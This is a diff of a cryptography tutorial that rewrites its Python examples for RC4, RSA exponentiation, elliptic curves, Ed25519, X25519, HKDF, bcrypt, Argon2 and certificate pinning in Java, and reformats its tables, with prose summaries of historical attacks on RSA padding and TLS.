+static int[] ksa(byte[] key) {
+    int[] S = new int[256];
+    for (int i = 0; i < 256; i++) S[i] = i;
+    int j = 0;
+    for (int i = 0; i < 256; i++) {
+        j = (j + S[i] + (key[i % key.length] & 0xFF)) % 256;
+        int tmp = S[i]; S[i] = S[j]; S[j] = tmp; // swap
+    }
+    return S;
+}
 ```
 
 **RC4 Pseudorandom Generation Algorithm (PRGA):**
-
-```python
-def prga(S):
-    i = j = 0
-    while True:
-        i = (i + 1) % 256
-        j = (j + S[i]) % 256
-        S[i], S[j] = S[j], S[i]
-        yield S[(S[i] + S[j]) % 256]
+```java
+// RC4 Pseudorandom Generation Algorithm (PRGA) — FOR EDUCATIONAL PURPOSES ONLY.
+static byte[] prga(int[] S, int length) {
+    byte[] keystream = new byte[length];
+    int i = 0, j = 0;
+    for (int n = 0; n < length; n++) {
+        i = (i + 1) % 256;
+        j = (j + S[i]) % 256;
+        int tmp = S[i]; S[i] = S[j]; S[j] = tmp; // swap
+        keystream[n] = (byte) S[(S[i] + S[j]) % 256];
+    }
+    return keystream;
+}
 ```
 
 **RC4 Weaknesses:**
-
 - **Weak key scheduling**: first bytes of keystream are biased (the Fluhrer-Mantin-Shamir attack)
 - **WEP exploit**: IV (24 bits) prepended to key, creating related-key bias; 40,000 packets break WEP
 - **RC4 NOMORE attack (2015)**: full plaintext recovery from HTTPS in hours by collecting millions of TLS connections
@@ -1265,7 +1238,6 @@ ctr     nonce[0] nonce[1] nonce[2]
 ### The Quarter Round
 
 ChaCha20's mixing function:
-
 ```
 a += b; d ^= a; d <<<= 16;
 c += d; b ^= c; b <<<= 12;
@@ -1330,14 +1302,14 @@ In public key cryptography, each party has **two mathematically related keys**:
 
 ### Asymmetric vs Symmetric
 
-|Property|Symmetric|Asymmetric|
-|---|---|---|
-|Keys|Same key for both parties|Public/Private key pair|
-|Key exchange|Hard (chicken-and-egg)|Easy (publish public key)|
-|Speed|100-1000× faster|Slow|
-|Key size for 128-bit security|128 bits|3072 bits (RSA)|
-|Use case|Bulk data encryption|Key exchange, signatures|
-|Common algorithms|AES, ChaCha20|RSA, ECDSA, Ed25519|
+| Property | Symmetric | Asymmetric |
+|----------|-----------|------------|
+| Keys | Same key for both parties | Public/Private key pair |
+| Key exchange | Hard (chicken-and-egg) | Easy (publish public key) |
+| Speed | 100-1000× faster | Slow |
+| Key size for 128-bit security | 128 bits | 3072 bits (RSA) |
+| Use case | Bulk data encryption | Key exchange, signatures |
+| Common algorithms | AES, ChaCha20 | RSA, ECDSA, Ed25519 |
 
 In practice, **hybrid encryption** is used: asymmetric crypto to exchange a symmetric key, symmetric crypto for actual data.
 
@@ -1362,7 +1334,6 @@ Destroy:     p, q, φ(n)
 ```
 
 **Worked Example (tiny numbers for illustration):**
-
 ```
 p = 61, q = 53
 n = 61 × 53 = 3233
@@ -1382,7 +1353,6 @@ Decrypt: M = C^d mod n
 ```
 
 **Example:**
-
 ```
 M = 65 (plaintext)
 C = 65^17 mod 3233 = 2790  (encryption)
@@ -1401,17 +1371,24 @@ Since ed ≡ 1 (mod φ(n)), we have M^(ed) ≡ M (mod n). Decryption undoes encr
 
 Computing M^e mod n naively is slow. The **square-and-multiply** algorithm is efficient:
 
-```python
-def modexp(base, exp, mod):
-    result = 1
-    base = base % mod
-    while exp > 0:
-        if exp % 2 == 1:         # if bit is set
-            result = (result * base) % mod
-        exp = exp >> 1           # shift right
-        base = (base * base) % mod
-    return result
-# O(log(exp)) multiplications — very efficient
+```java
+import java.math.BigInteger;
+
+// Square-and-multiply modular exponentiation — O(log exp) multiplications
+static BigInteger modExp(BigInteger base, BigInteger exp, BigInteger mod) {
+    BigInteger result = BigInteger.ONE;
+    base = base.mod(mod);
+    while (exp.compareTo(BigInteger.ZERO) > 0) {
+        if (exp.testBit(0)) {                      // if lowest bit is set
+            result = result.multiply(base).mod(mod);
+        }
+        exp = exp.shiftRight(1);                   // divide exponent by 2
+        base = base.multiply(base).mod(mod);       // square the base
+    }
+    return result;
+}
+// Java's BigInteger has this built-in:
+// BigInteger result = base.modPow(exp, mod);  ← use this in practice
 ```
 
 ## 9.4 RSA Security Analysis
@@ -1422,13 +1399,13 @@ The security of RSA rests on the assumption that factoring large numbers is hard
 
 Time complexity: `exp(c × n^(1/3) × (log n)^(2/3))`
 
-|Key Size|Security Bits|NIST Recommendation|
-|---|---|---|
-|1024|~80|Deprecated (insecure)|
-|2048|~112|Acceptable until 2030|
-|3072|~128|Recommended|
-|4096|~140|Long-term secure|
-|15360|~256|Post-quantum safe (classical)|
+| Key Size | Security Bits | NIST Recommendation |
+|----------|-------------|---------------------|
+| 1024 | ~80 | Deprecated (insecure) |
+| 2048 | ~112 | Acceptable until 2030 |
+| 3072 | ~128 | Recommended |
+| 4096 | ~140 | Long-term secure |
+| 15360 | ~256 | Post-quantum safe (classical) |
 
 ### RSA Attacks
 
@@ -1436,14 +1413,13 @@ Time complexity: `exp(c × n^(1/3) × (log n)^(2/3))`
 
 Textbook RSA (C = M^e mod n) is deterministic — same message always gives same ciphertext. This violates IND-CPA security.
 
-**2. PKCS#1 v1.5 Padding Attack (Bleichenbacher, 1998)**: The padding scheme for RSA encryption in SSL/TLS was vulnerable. By observing whether a server accepted or rejected padded ciphertexts, an attacker could decrypt messages via ~1 million adaptive queries.
+**2. PKCS#1 v1.5 Padding Attack (Bleichenbacher, 1998)**:
+The padding scheme for RSA encryption in SSL/TLS was vulnerable. By observing whether a server accepted or rejected padded ciphertexts, an attacker could decrypt messages via ~1 million adaptive queries.
 
 **3. OAEP (Optimal Asymmetric Encryption Padding)** — current standard:
-
 ```
 C = (M || label hash) → masking → MGF → encrypt with RSA
 ```
-
 Provably secure (IND-CCA2) under the RSA assumption. Always use RSA-OAEP.
 
 **4. Common modulus attack**: Never use the same n for two different (e, d) pairs.
@@ -1473,13 +1449,13 @@ Where H is a hash function. The hash prevents length extension attacks and makes
 
 RSA requires large keys (3072+ bits) for adequate security. Elliptic curve cryptography achieves the same security level with much smaller keys:
 
-|Security Level|RSA Key Size|ECC Key Size|Ratio|
-|---|---|---|---|
-|80-bit|1024 bits|160 bits|6.4×|
-|112-bit|2048 bits|224 bits|9.1×|
-|128-bit|3072 bits|256 bits|12×|
-|192-bit|7680 bits|384 bits|20×|
-|256-bit|15360 bits|521 bits|29×|
+| Security Level | RSA Key Size | ECC Key Size | Ratio |
+|---------------|-------------|-------------|-------|
+| 80-bit | 1024 bits | 160 bits | 6.4× |
+| 112-bit | 2048 bits | 224 bits | 9.1× |
+| 128-bit | 3072 bits | 256 bits | 12× |
+| 192-bit | 7680 bits | 384 bits | 20× |
+| 256-bit | 15360 bits | 521 bits | 29× |
 
 Smaller keys mean faster computation, less bandwidth, and smaller certificates.
 
@@ -1494,7 +1470,6 @@ y² = x³ + ax + b
 Plus a special "point at infinity" O (the identity element).
 
 **Example curve (secp256k1, used in Bitcoin):**
-
 ```
 y² = x³ + 7  (over prime field GF(p), p = 2²⁵⁶ - 2³² - 977)
 ```
@@ -1504,7 +1479,6 @@ y² = x³ + 7  (over prime field GF(p), p = 2²⁵⁶ - 2³² - 977)
 Given two points P = (x₁, y₁) and Q = (x₂, y₂) on a curve, their sum R = P + Q = (x₃, y₃):
 
 **Case 1: P ≠ Q (adding two distinct points)**
-
 ```
 λ = (y₂ - y₁) / (x₂ - x₁)  mod p
 x₃ = λ² - x₁ - x₂          mod p
@@ -1512,7 +1486,6 @@ y₃ = λ(x₁ - x₃) - y₁       mod p
 ```
 
 **Case 2: P = Q (point doubling)**
-
 ```
 λ = (3x₁² + a) / (2y₁)      mod p
 x₃ = λ² - 2x₁               mod p
@@ -1520,7 +1493,6 @@ y₃ = λ(x₁ - x₃) - y₁       mod p
 ```
 
 **Group law:**
-
 - P + O = P (O is identity)
 - P + (-P) = O (where -P = (x, -y))
 - Addition is commutative and associative
@@ -1529,16 +1501,26 @@ y₃ = λ(x₁ - x₃) - y₁       mod p
 
 **kP** means adding P to itself k times. This is computed efficiently via the **double-and-add algorithm** (analogous to square-and-multiply):
 
-```python
-def scalar_mult(k, P):
-    result = O  # point at infinity
-    addend = P
-    while k:
-        if k & 1:
-            result = point_add(result, addend)
-        addend = point_double(addend)
-        k >>= 1
-    return result
+```java
+import java.math.BigInteger;
+
+// Double-and-add scalar multiplication on an elliptic curve
+// ECPoint is a record/class holding (x, y) BigInteger coords
+static ECPoint scalarMult(BigInteger k, ECPoint P, ECCurve curve) {
+    ECPoint result = ECPoint.POINT_INFINITY; // identity element (O)
+    ECPoint addend = P;
+    while (k.compareTo(BigInteger.ZERO) > 0) {
+        if (k.testBit(0)) {                        // if bit is set
+            result = curve.pointAdd(result, addend);
+        }
+        addend = curve.pointDouble(addend);
+        k = k.shiftRight(1);
+    }
+    return result;
+}
+// In practice, use the JCA/BouncyCastle for ECC:
+// KeyPairGenerator kpg = KeyPairGenerator.getInstance("EC");
+// kpg.initialize(new ECGenParameterSpec("secp256r1"));
 ```
 
 For a 256-bit k, this requires at most 512 point operations (256 doublings + up to 256 additions).
@@ -1554,24 +1536,21 @@ For a 256-bit curve, breaking ECDLP requires ~2^128 operations — 128 bits of s
 ## 10.4 Standard Curves
 
 **NIST Curves (FIPS 186-4):**
-
-|Curve|Field Size|Security|Use Case|
-|---|---|---|---|
-|P-256 (secp256r1)|256 bits|128-bit|TLS, HTTPS|
-|P-384 (secp384r1)|384 bits|192-bit|High-security|
-|P-521 (secp521r1)|521 bits|260-bit|Very high-security|
+| Curve | Field Size | Security | Use Case |
+|-------|-----------|----------|----------|
+| P-256 (secp256r1) | 256 bits | 128-bit | TLS, HTTPS |
+| P-384 (secp384r1) | 384 bits | 192-bit | High-security |
+| P-521 (secp521r1) | 521 bits | 260-bit | Very high-security |
 
 **Modern Alternatives (Bernstein):**
-
-|Curve|Field Size|Security|Advantages|
-|---|---|---|---|
-|Curve25519|255 bits|128-bit|Fast, safe, no patent issues|
-|Curve448|448 bits|224-bit|High security, fast|
-|Ed25519|255 bits|128-bit|EdDSA signature scheme|
-|Ed448|448 bits|224-bit|EdDSA high security|
+| Curve | Field Size | Security | Advantages |
+|-------|-----------|----------|-----------|
+| Curve25519 | 255 bits | 128-bit | Fast, safe, no patent issues |
+| Curve448 | 448 bits | 224-bit | High security, fast |
+| Ed25519 | 255 bits | 128-bit | EdDSA signature scheme |
+| Ed448 | 448 bits | 224-bit | EdDSA high security |
 
 **Why Curve25519 is preferred over P-256:**
-
 - The NIST curves' constants were chosen opaquely — some distrust them (possible backdoor)
 - Curve25519 is complete (no exceptional cases), making implementations easier to get right
 - Better performance characteristics
@@ -1604,7 +1583,6 @@ Verify:
 ```
 
 **⚠️ CRITICAL: The nonce k must be unique for every signature!** If k is reused for two signatures:
-
 ```
 s₁ = k⁻¹(H(m₁) + dr) mod n
 s₂ = k⁻¹(H(m₂) + dr) mod n
@@ -1625,22 +1603,33 @@ Twisted Edwards curve: ax² + y² = 1 + dx²y²
 ```
 
 **Ed25519 advantages:**
-
 - Deterministic (no random nonce needed)
 - Complete (no exceptional cases — prevents implementation bugs)
 - ~2× faster than ECDSA on P-256
 - Resistant to many side-channel attacks
 - Used in SSH, GPG, TLS 1.3, Signal, WireGuard
 
-```python
-# Ed25519 in Python (using cryptography library)
-from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
+```java
+import java.security.*;
 
-private_key = Ed25519PrivateKey.generate()
-public_key = private_key.public_key()
+// Ed25519 in Java (JDK 15+ has built-in Ed25519 support)
+// Generate Ed25519 key pair
+KeyPairGenerator kpg = KeyPairGenerator.getInstance("Ed25519");
+KeyPair keyPair = kpg.generateKeyPair();
+PrivateKey privateKey = keyPair.getPrivate();
+PublicKey publicKey  = keyPair.getPublic();
 
-signature = private_key.sign(b"Hello, World!")
-public_key.verify(signature, b"Hello, World!")  # raises if invalid
+// Sign
+Signature signer = Signature.getInstance("Ed25519");
+signer.initSign(privateKey);
+signer.update("Hello, World!".getBytes(StandardCharsets.UTF_8));
+byte[] signature = signer.sign();
+
+// Verify
+Signature verifier = Signature.getInstance("Ed25519");
+verifier.initVerify(publicKey);
+verifier.update("Hello, World!".getBytes(StandardCharsets.UTF_8));
+boolean valid = verifier.verify(signature); // true
 ```
 
 ---
@@ -1656,14 +1645,12 @@ DH allows two parties to establish a shared secret **over a public channel** wit
 ### DH Protocol (Finite Field)
 
 **Setup (public parameters):**
-
 ```
 p = large prime
 g = generator of ℤ_p* (primitive root mod p)
 ```
 
 **Protocol:**
-
 ```
 Alice                           Bob
 ─────                           ───
@@ -1714,22 +1701,34 @@ Compute S = aB = a(bG) = abG   Compute S = bA = b(aG) = abG
 Same idea, but the group is an elliptic curve. ECDLP is harder than DLP for the same key size, so keys are much shorter.
 
 **ECDH with X25519 (Curve25519):**
+```java
+import java.security.*;
+import java.security.spec.ECGenParameterSpec;
+import javax.crypto.KeyAgreement;
 
-```python
-from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
+// ECDH with X25519 (Curve25519) — JDK 11+
+// Alice generates her key pair
+KeyPairGenerator aliceKpg = KeyPairGenerator.getInstance("X25519");
+KeyPair aliceKeyPair = aliceKpg.generateKeyPair();
 
-# Alice
-alice_private = X25519PrivateKey.generate()
-alice_public = alice_private.public_key()
+// Bob generates his key pair
+KeyPairGenerator bobKpg = KeyPairGenerator.getInstance("X25519");
+KeyPair bobKeyPair = bobKpg.generateKeyPair();
 
-# Bob
-bob_private = X25519PrivateKey.generate()
-bob_public = bob_private.public_key()
+// Alice computes shared secret
+KeyAgreement aliceKA = KeyAgreement.getInstance("XDH");
+aliceKA.init(aliceKeyPair.getPrivate());
+aliceKA.doPhase(bobKeyPair.getPublic(), true);
+byte[] aliceShared = aliceKA.generateSecret();
 
-# Key agreement
-alice_shared = alice_private.exchange(bob_public)
-bob_shared   = bob_private.exchange(alice_public)
-# alice_shared == bob_shared ✓
+// Bob computes shared secret
+KeyAgreement bobKA = KeyAgreement.getInstance("XDH");
+bobKA.init(bobKeyPair.getPrivate());
+bobKA.doPhase(aliceKeyPair.getPublic(), true);
+byte[] bobShared = bobKA.generateSecret();
+
+// Arrays.equals(aliceShared, bobShared) == true ✓
+// Derive symmetric keys from sharedSecret using HKDF
 ```
 
 ## 11.3 Forward Secrecy
@@ -1737,14 +1736,12 @@ bob_shared   = bob_private.exchange(alice_public)
 **Perfect Forward Secrecy (PFS)**: Even if the server's long-term private key is compromised in the future, past sessions remain confidential.
 
 **Without PFS (RSA key exchange):**
-
 - Client encrypts session key with server's RSA public key
 - Attacker records all ciphertext
 - 5 years later, attacker obtains server's RSA private key
 - Attacker decrypts all recorded sessions ← catastrophic!
 
 **With PFS (Ephemeral DH or ECDH):**
-
 - New random DH key pair generated for each session
 - Session key derived from ephemeral DH
 - After session ends, ephemeral keys are deleted
@@ -1815,7 +1812,6 @@ Verify(vk, m, σ) → {valid, invalid}
 ```
 
 In practice, we always sign **H(m)** (the hash of the message), not m directly:
-
 - Efficiency: sign a 32-byte hash instead of a multi-megabyte document
 - Security: prevents length extension attacks on the underlying signature operation
 
@@ -1864,28 +1860,28 @@ DSA has been largely superseded by ECDSA (shorter keys, same security).
 
 ## 12.5 ECDSA vs EdDSA Comparison
 
-|Property|ECDSA|EdDSA (Ed25519)|
-|---|---|---|
-|Randomness required|Yes (catastrophic if broken)|No (deterministic)|
-|Side-channel resistance|Requires care|Built-in|
-|Speed|Fast|Faster|
-|Implementation safety|Complex|Simple|
-|Standard curves|NIST P-256, P-384|Curve25519, Curve448|
-|Adoption|TLS, HTTPS, Bitcoin|SSH, Signal, WireGuard, TLS 1.3|
+| Property | ECDSA | EdDSA (Ed25519) |
+|----------|-------|-----------------|
+| Randomness required | Yes (catastrophic if broken) | No (deterministic) |
+| Side-channel resistance | Requires care | Built-in |
+| Speed | Fast | Faster |
+| Implementation safety | Complex | Simple |
+| Standard curves | NIST P-256, P-384 | Curve25519, Curve448 |
+| Adoption | TLS, HTTPS, Bitcoin | SSH, Signal, WireGuard, TLS 1.3 |
 
 **Recommendation:** Use Ed25519 for new systems. ECDSA P-256 if Ed25519 not available.
 
 ## 12.6 Signature Schemes Summary
 
-|Scheme|Based On|Key Size|Use Case|
-|---|---|---|---|
-|RSA-PSS|Integer factoring|3072 bits|Legacy systems, X.509 certs|
-|ECDSA P-256|ECDLP|256 bits|TLS, code signing, JWTs|
-|Ed25519|ECDLP (Edwards curve)|256 bits|SSH, WireGuard, modern systems|
-|Ed448|ECDLP (Edwards curve)|448 bits|High-security systems|
-|DSA|DLP|2048 bits|Legacy only|
-|Dilithium|Lattices|Variable|Post-quantum|
-|Falcon|NTRU lattices|Variable|Post-quantum compact|
+| Scheme | Based On | Key Size | Use Case |
+|--------|---------|----------|----------|
+| RSA-PSS | Integer factoring | 3072 bits | Legacy systems, X.509 certs |
+| ECDSA P-256 | ECDLP | 256 bits | TLS, code signing, JWTs |
+| Ed25519 | ECDLP (Edwards curve) | 256 bits | SSH, WireGuard, modern systems |
+| Ed448 | ECDLP (Edwards curve) | 448 bits | High-security systems |
+| DSA | DLP | 2048 bits | Legacy only |
+| Dilithium | Lattices | Variable | Post-quantum |
+| Falcon | NTRU lattices | Variable | Post-quantum compact |
 
 ## 12.7 Certificate Signing and PKI Preview
 
@@ -1903,7 +1899,6 @@ Certificate = {
 ```
 
 When your browser connects to google.com, it:
-
 1. Receives the certificate
 2. Verifies the CA's signature
 3. Checks the CA is in the browser's trust store
@@ -1932,11 +1927,17 @@ H: {0,1}* → {0,1}^n
 
 ### Required Security Properties
 
-**1. Preimage Resistance (One-Way)** Given h, it's computationally infeasible to find m such that H(m) = h. → Security: 2^n operations
+**1. Preimage Resistance (One-Way)**
+Given h, it's computationally infeasible to find m such that H(m) = h.
+→ Security: 2^n operations
 
-**2. Second Preimage Resistance (Weak Collision Resistance)** Given m₁, it's computationally infeasible to find m₂ ≠ m₁ such that H(m₁) = H(m₂). → Security: 2^n operations
+**2. Second Preimage Resistance (Weak Collision Resistance)**
+Given m₁, it's computationally infeasible to find m₂ ≠ m₁ such that H(m₁) = H(m₂).
+→ Security: 2^n operations
 
-**3. Collision Resistance (Strong)** It's computationally infeasible to find any pair m₁ ≠ m₂ such that H(m₁) = H(m₂). → Security: 2^(n/2) operations (birthday bound)
+**3. Collision Resistance (Strong)**
+It's computationally infeasible to find any pair m₁ ≠ m₂ such that H(m₁) = H(m₂).
+→ Security: 2^(n/2) operations (birthday bound)
 
 Note: Collision resistance implies second preimage resistance, but not vice versa.
 
@@ -1975,18 +1976,18 @@ The security of a sponge with rate r and capacity c: min(c/2, n) bits.
 
 ## 13.3 Hash Algorithm Reference
 
-|Algorithm|Output|Security|Notes|
-|---|---|---|---|
-|MD5|128 bits|**Broken**|Collisions found in seconds|
-|SHA-1|160 bits|**Broken**|Google SHAttered attack (2017)|
-|SHA-256|256 bits|128-bit|Widely used, recommended|
-|SHA-384|384 bits|192-bit|NSA Suite B|
-|SHA-512|512 bits|256-bit|Faster than SHA-256 on 64-bit|
-|SHA-512/256|256 bits|128-bit|SHA-512 truncated, faster on 64-bit|
-|SHA3-256|256 bits|128-bit|Keccak, immune to length extension|
-|SHA3-512|512 bits|256-bit|Keccak|
-|BLAKE2b|512 bits|256-bit|Very fast, safer than SHA-2|
-|BLAKE3|256 bits|128-bit|Fastest, parallelizable|
+| Algorithm | Output | Security | Notes |
+|-----------|--------|----------|-------|
+| MD5 | 128 bits | **Broken** | Collisions found in seconds |
+| SHA-1 | 160 bits | **Broken** | Google SHAttered attack (2017) |
+| SHA-256 | 256 bits | 128-bit | Widely used, recommended |
+| SHA-384 | 384 bits | 192-bit | NSA Suite B |
+| SHA-512 | 512 bits | 256-bit | Faster than SHA-256 on 64-bit |
+| SHA-512/256 | 256 bits | 128-bit | SHA-512 truncated, faster on 64-bit |
+| SHA3-256 | 256 bits | 128-bit | Keccak, immune to length extension |
+| SHA3-512 | 512 bits | 256-bit | Keccak |
+| BLAKE2b | 512 bits | 256-bit | Very fast, safer than SHA-2 |
+| BLAKE3 | 256 bits | 128-bit | Fastest, parallelizable |
 
 **Recommendation:** SHA-256 or SHA-3-256 for most uses. BLAKE3 for high-performance.
 
@@ -2076,13 +2077,11 @@ Decrypt: plaintext = AEAD_Decrypt(key, nonce, ciphertext, tag, aad)
 ```
 
 **Why AEAD is necessary:** Historically, people combined cipher + MAC incorrectly:
-
 - **Encrypt-then-MAC (EtM)**: C = Enc(P), T = MAC(C) — Secure ✓
 - **MAC-then-Encrypt (MtE)**: T = MAC(P), C = Enc(P||T) — Insecure (padding oracle)
 - **Encrypt-and-MAC (E&M)**: C = Enc(P), T = MAC(P) — Leaks MAC of plaintext
 
 AEAD avoids these composition problems. Always use an AEAD mode:
-
 - `AES-256-GCM`
 - `ChaCha20-Poly1305`
 - `AES-256-CCM`
@@ -2113,12 +2112,23 @@ HKDF consists of two steps:
 ```
 
 **Example uses:**
+```java
+// From ECDH shared secret, derive AES key + HMAC key using HKDF (Bouncy Castle):
+// Maven: org.bouncycastle:bcprov-jdk18on
+import org.bouncycastle.crypto.generators.HKDFBytesGenerator;
+import org.bouncycastle.crypto.params.HKDFParameters;
+import org.bouncycastle.crypto.digests.SHA256Digest;
 
-```
-# From ECDH shared secret, derive AES key + HMAC key:
-prk = HKDF-Extract(salt=random_32, ikm=ecdh_shared_secret)
-aes_key  = HKDF-Expand(prk, info=b"AES-256-GCM", length=32)
-hmac_key = HKDF-Expand(prk, info=b"HMAC-SHA256", length=32)
+byte[] salt             = new byte[32]; new SecureRandom().nextBytes(salt);
+byte[] ecdhSharedSecret = /* from KeyAgreement.generateSecret() */ ;
+
+HKDFBytesGenerator hkdf = new HKDFBytesGenerator(new SHA256Digest());
+hkdf.init(new HKDFParameters(ecdhSharedSecret, salt, "context".getBytes()));
+
+byte[] aesKey  = new byte[32]; hkdf.generateBytes(aesKey,  0, 32); // AES-256 key
+byte[] hmacKey = new byte[32]; hkdf.generateBytes(hmacKey, 0, 32); // HMAC-SHA256 key
+
+// TLS 1.3 uses HKDF internally — Java's TLS stack does this automatically
 ```
 
 ### PBKDF2 — Password-Based KDF 2
@@ -2135,10 +2145,9 @@ More precisely:
 ```
 
 **Parameters:**
-
 - `c` = iteration count (higher = slower = more secure)
-    - NIST recommends 600,000 iterations with HMAC-SHA256 (2023)
-    - OWASP recommends 600,000 for SHA256, 210,000 for SHA512
+  - NIST recommends 600,000 iterations with HMAC-SHA256 (2023)
+  - OWASP recommends 600,000 for SHA256, 210,000 for SHA512
 - `salt` = random 16+ bytes (prevents rainbow tables, makes each hash unique)
 - Output length = desired key length
 
@@ -2162,12 +2171,21 @@ $2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8X3UJ2o2YeGq.GjVl3a
 
 **Cost factor:** Each increment doubles the time. Cost 12 ≈ 300ms, cost 14 ≈ 1.2 seconds.
 
-```python
-import bcrypt
-# Hash a password
-hashed = bcrypt.hashpw(b"password", bcrypt.gensalt(rounds=12))
-# Verify
-bcrypt.checkpw(b"password", hashed)  # True
+```java
+// bcrypt in Java — using Spring Security Crypto (or jBCrypt library)
+// Maven: org.springframework.security:spring-security-crypto
+import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
+
+BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12); // strength = cost factor 12
+// Hash a password
+String hashed = encoder.encode("password");
+// Verify
+boolean valid = encoder.matches("password", hashed); // true
+
+// --- Alternative: using jBCrypt directly ---
+// Maven: org.mindrot:jbcrypt:0.4
+// String hashed = BCrypt.hashpw("password", BCrypt.gensalt(12));
+// boolean valid  = BCrypt.checkpw("password", hashed);
 ```
 
 **Limitation:** bcrypt has a 72-character password limit and 4KB memory requirement (not memory-hard enough for modern GPUs).
@@ -2206,44 +2224,60 @@ OWASP recommended parameters (2023):
   parallelism: 4 threads
 ```
 
-```python
-import argon2
-ph = argon2.PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
-hash = ph.hash("password123")
-ph.verify(hash, "password123")  # True
+```java
+// Argon2id in Java — using Bouncy Castle (recommended) or argon2-jvm
+// Maven: org.bouncycastle:bcprov-jdk18on  or  de.mkammerer:argon2-jvm
+
+// Option 1: argon2-jvm library (simplest)
+import de.mkammerer.argon2.Argon2;
+import de.mkammerer.argon2.Argon2Factory;
+
+Argon2 argon2 = Argon2Factory.createAdvanced(Argon2Factory.Argon2Types.ARGON2id);
+// Hash: iterations=3, memory=65536 KB (64MB), parallelism=4
+String hash = argon2.hash(3, 65536, 4, "password123".toCharArray());
+// Verify
+boolean valid = argon2.verify(hash, "password123".toCharArray());
+argon2.wipeArray("password123".toCharArray()); // clear password from memory
+
+// Option 2: Bouncy Castle Argon2 (no extra dependency)
+import org.bouncycastle.crypto.generators.Argon2BytesGenerator;
+import org.bouncycastle.crypto.params.Argon2Parameters;
+byte[] salt = new byte[16]; new SecureRandom().nextBytes(salt);
+Argon2Parameters params = new Argon2Parameters.Builder(Argon2Parameters.ARGON2_id)
+    .withSalt(salt).withIterations(3).withMemoryAsKB(65536).withParallelism(4).build();
+Argon2BytesGenerator gen = new Argon2BytesGenerator();
+gen.init(params);
+byte[] hash32 = new byte[32];
+gen.generateBytes("password123".toCharArray(), hash32);
 ```
 
 ### Password Hashing Comparison
 
-|Algorithm|Memory Hard|GPU Resistant|Recommended|
-|---|---|---|---|
-|MD5 + salt|❌|❌|**Never**|
-|SHA-256 + salt|❌|❌|**Never**|
-|bcrypt|❌ (4KB)|Somewhat|OK (legacy)|
-|scrypt|✅|✅|OK|
-|Argon2id|✅ ✅|✅ ✅|**Best**|
+| Algorithm | Memory Hard | GPU Resistant | Recommended |
+|-----------|------------|--------------|-------------|
+| MD5 + salt | ❌ | ❌ | **Never** |
+| SHA-256 + salt | ❌ | ❌ | **Never** |
+| bcrypt | ❌ (4KB) | Somewhat | OK (legacy) |
+| scrypt | ✅ | ✅ | OK |
+| Argon2id | ✅ ✅ | ✅ ✅ | **Best** |
 
 ## 14.3 Key Stretching and Salting
 
 **Salt:** A random value added to each password before hashing:
-
 ```
 hash = H(salt || password)
 store: (salt, hash)
 ```
 
 Why salting matters:
-
 - Without salt: identical passwords produce identical hashes → rainbow table attack works
 - With salt: each password has unique salt → precomputed tables useless
 - Salt does NOT need to be secret — just unique per password
 
 **Pepper:** A secret value stored separately from the database:
-
 ```
 hash = Argon2id(password, salt, pepper)
 ```
-
 If the database is stolen without the pepper (stored in an HSM/environment variable), the hashes cannot be cracked.
 
 ---
@@ -2267,15 +2301,14 @@ Application Layer  HTTP/SMTP/IMAP/etc.
 ```
 
 **TLS history:**
-
-|Version|Year|Status|
-|---|---|---|
-|SSL 2.0|1995|Broken|
-|SSL 3.0|1996|Broken (POODLE)|
-|TLS 1.0|1999|Deprecated|
-|TLS 1.1|2006|Deprecated|
-|TLS 1.2|2008|Acceptable|
-|TLS 1.3|2018|**Current standard**|
+| Version | Year | Status |
+|---------|------|--------|
+| SSL 2.0 | 1995 | Broken |
+| SSL 3.0 | 1996 | Broken (POODLE) |
+| TLS 1.0 | 1999 | Deprecated |
+| TLS 1.1 | 2006 | Deprecated |
+| TLS 1.2 | 2008 | Acceptable |
+| TLS 1.3 | 2018 | **Current standard** |
 
 ## 15.2 TLS 1.3 Handshake
 
@@ -2308,7 +2341,6 @@ ClientHello:
 ```
 
 Key improvements in TLS 1.3:
-
 - **1-RTT handshake** (down from 2 in TLS 1.2)
 - **0-RTT resumption** for returning connections (with replay caveats)
 - **Only secure cipher suites**: TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256, TLS_AES_128_GCM_SHA256
@@ -2353,32 +2385,26 @@ AEAD encryption uses the session key and a per-record nonce (derived by XORing t
 ## 15.5 Common TLS Attacks
 
 ### Downgrade Attacks
-
 Attacker manipulates the ClientHello to force use of weaker protocols/ciphers. Mitigated by:
-
 - TLS_FALLBACK_SCSV (RFC 7507)
 - TLS 1.3's handshake transcript in Finished message
 
 ### BEAST (Browser Exploit Against SSL/TLS)
-
 - Affected TLS 1.0 CBC mode
 - Exploited predictable IVs
 - Fixed: TLS 1.1+ uses explicit random IVs; TLS 1.3 eliminates CBC
 
 ### POODLE (Padding Oracle On Downgraded Legacy Encryption)
-
 - Exploited SSL 3.0 CBC padding oracle
 - Fixed: disable SSL 3.0; TLS 1.3 eliminates CBC
 
 ### Heartbleed (CVE-2014-0160)
-
 - Buffer over-read in OpenSSL's heartbeat extension
 - Could leak server private keys, session keys, user passwords from server memory
 - Not a TLS protocol flaw — an implementation bug
 - Fixed: OpenSSL 1.0.1g
 
 ### CRIME/BREACH
-
 - CRIME: compressed TLS records reveal data via length oracle
 - BREACH: HTTP-level compression oracle for CSRF tokens
 - Fixed: disable TLS compression; BREACH mitigated by per-request nonces
@@ -2389,14 +2415,26 @@ TLS trusts any certificate signed by any trusted CA. Certificate pinning adds an
 
 Used in mobile apps to prevent MITM even with rogue CA:
 
-```python
-# Example: Pin a specific public key hash
-PINNED_HASH = "sha256//YLh1dUR9y6Kja30RrAn7JKnbQG/uEtLMkBgFF2Fuihg="
+```java
+import java.security.*;
+import java.security.cert.X509Certificate;
+import java.util.Base64;
 
-def verify_pin(cert):
-    pubkey_der = cert.public_key().public_bytes(...)
-    digest = sha256(pubkey_der)
-    return b64encode(digest) == PINNED_HASH
+// Pin a specific public key hash (SPKI pin — standard approach)
+private static final String PINNED_SPKI_HASH =
+    "sha256//YLh1dUR9y6Kja30RrAn7JKnbQG/uEtLMkBgFF2Fuihg=";
+
+static boolean verifyPin(X509Certificate cert) throws Exception {
+    // Extract the Subject Public Key Info (DER encoded)
+    byte[] spkiDer = cert.getPublicKey().getEncoded(); // X.509 / SubjectPublicKeyInfo
+    // SHA-256 hash it
